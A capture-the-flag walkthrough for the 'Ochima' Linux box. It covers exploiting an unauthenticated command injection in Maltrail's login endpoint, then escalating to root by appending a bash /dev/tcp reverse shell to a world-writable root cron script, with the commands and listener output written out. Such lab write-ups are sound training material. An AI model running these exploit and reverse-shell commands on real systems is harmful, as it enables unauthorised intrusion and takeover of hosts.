#Linux #Maltrail #RCE #CVE #CronJob #WritableScript #BashTCP

## Overview

Ochima is a straightforward Linux box built around a known unauthenticated RCE vulnerability in Maltrail v0.53, served on port 8338. Once inside as `snort`, a world-writable cron script owned by root provides an immediate and clean path to a root shell via bash TCP redirect.

## Recon

### Port Scan

```
22/tcp   open  ssh
80/tcp   open  http
8338/tcp open  unknown
```

Port 8338 stood out as non-standard. Browsing to it reveals a Maltrail login page.

### Version Identification

The landing page exposes the application version:

```
Maltrail (v0.52)
```

The login gate prevents further browsing, but the version string is enough. Searching for Maltrail exploits turns up a public pre-auth RCE targeting v0.53:

**Maltrail-v0.53-Exploit**
https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py

> **Why the version mismatch doesn't matter:** The v0.53 exploit targets a command injection in the login endpoint that was present in earlier releases. The application advertises v0.52, but the vulnerable code path existed before the patch was applied, so the exploit still lands.

## Foothold

### Maltrail Unauthenticated RCE

The exploit takes an attacker IP, listener port, and target URL, then injects a payload into the login endpoint:

```sh
python3 exploit.py 192.168.45.244 80 http://192.168.180.32:8338/
Running exploit on http://192.168.180.32:8338//login
```

Listener catches the shell as `snort`:

```sh
rlwrap nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.32] 43628
$ whoami
snort
```

TTY upgrade:

```sh
python -c 'import pty;pty.spawn("/bin/bash")'
snort@ochima:/opt/maltrail-0.53$
```

## Privilege Escalation

### World-Writable Cron Script

LinPEAS flags a backup script in `/var/backups` and notes root activity:

```sh
snort@ochima:/var/backups$ cat etc_Backup.sh
#! /bin/bash
tar -cf /home/snort/etc_backup.tar /etc
```

Permissions:

```sh
-rwxrwxrwx  1 root root   54 Dec 11  2023 etc_Backup.sh
```

> **Why this is immediately game over:** The file is owned by root and executed by root on a cron schedule, but every user on the system can write to it. There's no need to race conditions or bypass anything. Append a reverse shell, wait for the cron trigger, receive root.

LinPEAS identified this as a cron file and confirmed root had logged in recently, which is a reliable indicator the job is active.

Appending a bash reverse shell:

```sh
echo 'bash -i >& /dev/tcp/192.168.45.167/8338 0>&1' >> etc_Backup.sh
```

Confirming the append:

```sh
snort@ochima:/var/backups$ cat etc_Backup.sh
#! /bin/bash
tar -cf /home/snort/etc_backup.tar /etc
bash -i >& /dev/tcp/192.168.45.167/8338 0>&1
```

## Root

After waiting for the cron to fire, the root shell arrives:

```sh
rlwrap nc -lvnp 8338
listening on [any] 8338 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.204.32] 48212
root@ochima:~# whoami
root
```

```sh
root@ochima:~# cat proof.txt
‹redacted›
```

## Takeaways

- **Version strings in login pages are free intelligence.** Maltrail advertised its version before authentication was required, cutting recon time to seconds.
- **World-writable files owned by root are instant privesc.** The `rwxrwxrwx` on a root-executed cron script is worse than a SUID binary, it requires no exploit, just a text append.
- **LinPEAS + cron file detection:** LinPEAS flagging a file as cron-related and showing recent root login together is a strong signal the job is actively firing. `pspy` would confirm it, but isn't always necessary.
